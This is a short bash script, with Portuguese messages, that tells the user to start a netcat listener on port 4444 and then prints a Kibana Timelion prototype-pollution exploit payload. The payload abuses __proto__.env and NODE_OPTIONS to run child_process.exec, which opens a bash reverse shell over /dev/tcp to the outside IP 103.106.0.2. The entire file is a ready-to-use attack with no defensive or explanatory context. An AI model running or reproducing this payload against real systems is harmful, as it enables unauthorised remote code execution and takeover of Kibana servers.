#!/bin/bash


echo -e "\e[1;32mAbrindo um listener para receber um reverse-shell --> nc -nlvp 4444\e[0m"
echo ""

echo -e "Exploit Kibana: " 
cat <<EOF 
es(*).props(label.__proto__.env.AAAA='require("child_process").exec("/bin/bash -c \" /bin/bash -i >& /dev/tcp/103.106.0.2/4444 0>&1\"");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ') 
EOF
